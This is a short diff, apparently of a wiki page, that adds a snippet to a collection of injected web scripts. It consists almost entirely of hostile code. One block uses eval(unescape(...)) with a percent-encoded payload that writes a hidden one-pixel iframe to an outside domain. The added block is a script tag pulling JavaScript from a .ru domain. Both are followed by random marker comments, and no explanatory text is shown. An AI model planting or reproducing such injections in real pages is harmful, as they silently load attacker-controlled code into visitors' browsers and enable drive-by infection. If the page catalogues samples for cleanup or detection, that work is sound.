@@ -142,3 +142,8 @@ f(s.charAt(i)=="Z"){s1="%"}else{s1=s.charAt(i)}r=r+s1;}return unescape(r);}funct
 {{{
 <script>eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%68%69%6E%6E%77%73%2E%63%6F%6D%2F%3F%33%36%35%34%36%38%22%20%77%69%64%74%68%3D%31%20%68%65%69%67%68%74%3D%31%3E%3C%2F%69%66%72%61%6D%65%3E%27%29'));</script><!-- uy7gdr5332rkmn -->
 }}}
+
+{{{
+<script type="text/javascript" src="http://riotassistance.ru/Page_View.js"></script>
+<!--f274e380f1f74f5cb19c11163dc9baf6-->
+}}}
